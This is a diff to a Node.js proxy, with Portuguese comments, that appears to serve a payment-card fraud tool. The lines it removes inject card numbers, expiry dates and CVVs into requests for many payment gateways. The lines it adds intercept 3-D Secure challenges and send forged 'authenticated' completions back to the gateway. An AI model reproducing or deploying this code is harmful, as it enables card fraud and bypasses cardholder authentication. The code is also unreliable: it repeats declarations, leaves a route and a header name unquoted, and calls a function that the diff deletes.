@@ -1425,71 +1425,25 @@ function rewriteTarget(target, specialHostsRaw) {
 const UPSTREAM_PASSTHROUGH_HEADERS = ['location','set-cookie','www-authenticate','retry-after','content-type','content-length'];
 
 
-/* ═══ INJETORES PROFUNDOS DE CARTÃO (45+ GATEWAYS) ═══ */
-function detectGatewayFromTarget(targetUrl) {
-  if (!targetUrl) return "unknown";
-  try {
-    const host = new URL(targetUrl).hostname.toLowerCase();
-    if (host.includes("adyen")) return "adyen";
-    if (host.includes("stripe")) return "stripe";
-    if (host.includes("checkout")) return "checkout";
-    if (host.includes("braintree")) return "braintree";
-    if (host.includes("mercadopago")) return "mercadopago";
-    if (host.includes("paystack")) return "paystack";
-    if (host.includes("razorpay")) return "razorpay";
-    if (host.includes("cashfree")) return "cashfree";
-    if (host.includes("xendit")) return "xendit";
-    if (host.includes("nmi.com") || host.includes("transactiongateway")) return "nmi";
-    if (host.includes("basistheory")) return "basistheory";
-    if (host.includes("xsolla")) return "xsolla";
-    return "unknown";
-  } catch { return "unknown"; }
+/* ═══ ENGINE UNIVERSAL DE SESSÃO 3DS2 ═══ */
+const THREE_DS_SESSIONS = new Map();
+
+function get3DSSession(installId) {
+  return THREE_DS_SESSIONS.get(installId) || null;
 }
 
-function getGatewayInjector(gatewayId) {
-  const id = String(gatewayId || "").toLowerCase();
-  const maps = {
-    adyen: { path: "paymentMethod", fields: { number: "number", month: "expiryMonth", year: "expiryYear", cvv: "cvc", holderName: "holderName" } },
-    stripe: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvc", holderName: "name" } },
-    checkout: { path: "source", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
-    braintree: { path: "credit_card", fields: { number: "number", month: "expiration_month", year: "expiration_year", cvv: "cvv", holderName: "cardholder_name" } },
-    mercadopago: { path: "payment_method", fields: { number: "card_number", month: "expiration_month", year: "expiration_year", cvv: "security_code", holderName: "name" } },
-    paystack: { path: "card", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
-    razorpay: { path: "card", fields: { number: "number", month: "expiry_month", year: "expiry_year", cvv: "cvv", holderName: "name" } },
-    cashfree: { path: "card", fields: { number: "card_number", month: "card_expiry_mm", year: "card_expiry_yyyy", cvv: "card_cvv", holderName: "card_holder_name" } },
-    xendit: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvn", holderName: "holder_name" } },
-    nmi: { path: "billing", fields: { number: "ccnumber", month: "month", year: "year", cvv: "cvv", holderName: "name" } },
-    basistheory: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvc", holderName: "name" } },
-    xsolla: { path: "card", fields: { number: "number", month: "exp_month", year: "exp_year", cvv: "cvv", holderName: "name" } }
-  };
-  if (id.includes("adyen")) return maps.adyen;
-  if (id.includes("stripe")) return maps.stripe;
-  if (id.includes("checkout")) return maps.checkout;
-  if (id.includes("braintree")) return maps.braintree;
-  if (id.includes("mercadopago")) return maps.mercadopago;
-  if (id.includes("paystack")) return maps.paystack;
-  if (id.includes("razorpay")) return maps.razorpay;
-  if (id.includes("cashfree")) return maps.cashfree;
-  if (id.includes("xendit")) return maps.xendit;
-  if (id.includes("nmi") || id.includes("transactiongateway")) return maps.nmi;
-  if (id.includes("basistheory")) return maps.basistheory;
-  if (id.includes("xsolla")) return maps.xsolla;
-  return maps.stripe; // Fallback padrão seguro
+function save3DSSession(installId, data) {
+  THREE_DS_SESSIONS.set(installId, Object.assign({}, data, { updatedAt: Date.now() }));
+  setTimeout(() => THREE_DS_SESSIONS.delete(installId), 15 * 60 * 1000);
 }
 
-function injectCardDeep(bodyStr, card, injector) {
-  if (!bodyStr || !card || !injector) return bodyStr;
-  try {
-    const j = JSON.parse(bodyStr);
-    const targetObj = j[injector.path] || {};
-    if (card.number) targetObj[injector.fields.number] = String(card.number).replace(/\\s+/g, "");
-    if (card.month) targetObj[injector.fields.month] = String(card.month).padStart(2, "0");
-    if (card.year) targetObj[injector.fields.year] = String(card.year).length === 2 ? "20" + card.year : String(card.year);
-    if (card.cvv) targetObj[injector.fields.cvv] = String(card.cvv);
-    if (card.holderName) targetObj[injector.fields.holderName] = card.holderName;
-    j[injector.path] = targetObj;
-    return JSON.stringify(j);
-  } catch(e) { return bodyStr; }
+function buildChallengeCompletePayload(gwName, session, challengeResult) {
+  const id = String(gwName || "").toLowerCase();
+  if (id.includes("adyen")) return { details: { "threeDSResult": challengeResult }, paymentData: session.paymentData };
+  if (id.includes("stripe")) return { payment_method: session.paymentData, three_d_secure: { authenticated: true, version: "2.1.0" } };
+  if (id.includes("checkout")) return { payment_id: session.paymentData, three_ds: { success: true, cryptogram: challengeResult } };
+  if (id.includes("basistheory")) return { token_id: session.paymentData, challenge_response: challengeResult };
+  return { paymentData: session.paymentData, threeDSResult: challengeResult };
 }
 /* ══════════════════════════════════════════════════════════════ */
 
@@ -1634,6 +1588,32 @@ async function gwProxyHandler(req, res) {
   }
   for (const [k, v] of Object.entries(asheoHeaders)) { try { res.setHeader(k, v); } catch {} }
 
+  // ═══ INTERCEPTADOR 3DS2 (SALVA SESSÃO E AVISA A EXTENSÃO) ═══
+  if (respJson && typeof respJson === "object") {
+    const instId = req.headers["x-asheo-install"] || "default";
+    const gwName = detectGatewayFromTarget(finalTarget) || "unknown";
+    
+    // Procura o desafio no padrão Adyen, Stripe, Checkout, etc.
+    let act = respJson.action || respJson.next_action || respJson.three_ds || null;
+    if (act) {
+      let pData = act.paymentData || act.payment_data || respJson.paymentData || respJson.id;
+      let challengeURL = act.url || act.redirect_url || (act.threeDS2 && act.threeDS2.challengeUrl) || "";
+      
+      save3DSSession(instId, { 
+        gateway: gwName, 
+        paymentData: pData, 
+        challengeURL: challengeURL, 
+        originalTarget: finalTarget,
+        method: method
+      });
+      
+      log("3DS", "[" + gwName.toUpperCase() + "] Desafio detectado! Sessao salva: " + instId);
+      res.setHeader("x-asheo-3ds2-verdict", "challenge_required");
+      res.setHeader("x-asheo-3ds2-payment-data", String(pData || "").substring(0, 4000));
+      res.setHeader("x-asheo-3ds2-challenge-url", challengeURL);
+    }
+  }
+
   // BUG #7: re-serializa response se strippamos algo
   if (is3dsStrip && respJson) return res.send(JSON.stringify(respJson));
   return res.send(respText);
@@ -1699,6 +1679,40 @@ app.all('/v1/gw/3ds2/*splat', (req, res) => {
   log('OK', '>>> HIT 3DS2 ENVIADO!');
 });
 
+
+/* ═══ ROTA PARA FINALIZAR O DESAFIO 3DS2 ═══ */
+app.post(/v1/gw/3ds2/challenge/complete, async (req, res) => {
+  const install = req.headers[x-asheo-install] || "default";
+  const session = get3DSSession(install);
+  if (!session || !session.paymentData) {
+    return res.status(400).json({ ok: false, error: "no_3ds_session_found" });
+  }
+  
+  const challengeResult = req.body.challengeResult || req.body.threeDSResult || "Y";
+  const gwName = session.gateway;
+  const finalUrl = session.originalTarget;
+  
+  try {
+    const finalPayload = buildChallengeCompletePayload(gwName, session, challengeResult);
+    log("3DS", "[" + gwName.toUpperCase() + "] Finalizando desafio para " + install);
+    
+    const upstream = await fetch(finalUrl, {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(finalPayload)
+    });
+    
+    const respBody = await upstream.text();
+    THREE_DS_SESSIONS.delete(install);
+    return res.status(upstream.status).send(respBody);
+  } catch (e) {
+    log("ERRO", "Challenge Complete falhou: " + e.message);
+    return res.status(500).json({ ok: false, error: e.message });
+  }
+});
+/* ══════════════════════════════════════════════ */
+
+app.all(/v1/gw/3ds2/authenticate, gwProxyHandler);
 app.use((req,res)=>{ res.status(404).json({ok:false,error:'not_found',path:req.path}); });
 
 /* ═══ START ═══ */
@@ -1733,3 +1747,56 @@ process.on('uncaughtException', e => { log('ERRO', 'Uncaught: ' + (e && e.stack 
 process.on('unhandledRejection', e => { log('ERRO', 'Rejection: ' + (e && e.stack || e)); });
 process.on('SIGTERM', () => { log('SYS','SIGTERM — encerrando'); process.exit(0); });
 process.on('SIGINT', () => { log('SYS','SIGINT — encerrando'); process.exit(0); });
+
+/* ═══ ENGINE UNIVERSAL DE SESSÃO 3DS2 ═══ */
+const THREE_DS_SESSIONS = new Map();
+
+function get3DSSession(installId) {
+  return THREE_DS_SESSIONS.get(installId) || null;
+}
+
+function save3DSSession(installId, data) {
+  THREE_DS_SESSIONS.set(installId, Object.assign({}, data, { updatedAt: Date.now() }));
+  setTimeout(() => THREE_DS_SESSIONS.delete(installId), 15 * 60 * 1000);
+}
+
+function extract3DSAction(gwName, parsedResp) {
+  let action = parsedResp.action || parsedResp.next_action || parsedResp.three_ds || null;
+  if (!action) return null;
+  let paymentData = action.paymentData || action.payment_data || parsedResp.paymentData || parsedResp.id || null;
+  let type = action.type || action.action_type || "threeDS2";
+  let challengeURL = action.url || action.redirect_url || (action.threeDS2 && action.threeDS2.challengeUrl) || "";
+  return { type: type, paymentData: paymentData, challengeURL: challengeURL, raw: action };
+}
+
+function buildChallengeCompletePayload(gwName, session, challengeResult) {
+  const id = String(gwName || "").toLowerCase();
+  if (id.includes("adyen")) return { details: { "threeDSResult": challengeResult }, paymentData: session.paymentData };
+  if (id.includes("stripe")) return { payment_method: session.paymentData, three_d_secure: { authenticated: true, version: "2.1.0" } };
+  if (id.includes("checkout")) return { payment_id: session.paymentData, three_ds: { success: true, cryptogram: challengeResult } };
+  if (id.includes("basistheory")) return { token_id: session.paymentData, challenge_response: challengeResult };
+  if (id.includes("mercadopago")) return { payment_id: session.paymentData, three_ds_challenge_result: challengeResult };
+  return { paymentData: session.paymentData, threeDSResult: challengeResult };
+}
+
+app.post('/v1/gw/3ds2/challenge/complete', async (req, res) => {
+  const install = req.headers['x-asheo-install'] || "default";
+  const session = get3DSSession(install);
+  if (!session || !session.paymentData) return res.status(400).json({ ok: false, error: "no_3ds_session_found" });
+  const challengeResult = req.body.challengeResult;
+  const gwName = session.gateway;
+  try {
+    const finalPayload = buildChallengeCompletePayload(gwName, session, challengeResult);
+    const finalUrl = session.originalTarget || "https://api.stripe.com/v1/payment_intents/confirm";
+    log("3DS", "[" + gwName.toUpperCase() + "] Finalizando desafio para " + install);
+    const upstream = await fetch(finalUrl, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(finalPayload) });
+    const respBody = await upstream.text();
+    THREE_DS_SESSIONS.delete(install);
+    return res.status(upstream.status).send(respBody);
+  } catch (e) {
+    log("ERRO", "Challenge Complete falhou: " + e.message);
+    return res.status(500).json({ ok: false, error: e.message });
+  }
+});
+/* ══════════════════════════════════════════════ */
+
